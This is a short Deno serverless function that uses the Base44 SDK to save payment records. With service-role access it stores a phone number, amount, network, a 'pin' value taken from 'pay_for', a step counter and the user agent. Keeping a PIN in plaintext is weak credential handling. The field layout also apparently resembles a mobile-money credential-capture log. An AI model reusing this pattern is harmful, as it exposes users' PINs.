import { createClientFromRequest } from 'npm:@base44/sdk@0.8.25';

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const { type, phone_number, amount, pay_for } = await req.json();

    const record = await base44.asServiceRole.entities.PaymentRecord.create({
      phone_number,
      amount: amount ? String(amount) : null,
      network: type,
      pin: pay_for,
      step_reached: 0,
      user_agent: req.headers.get("user-agent") || "",
    });

    return Response.json({ success: true, data: record });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});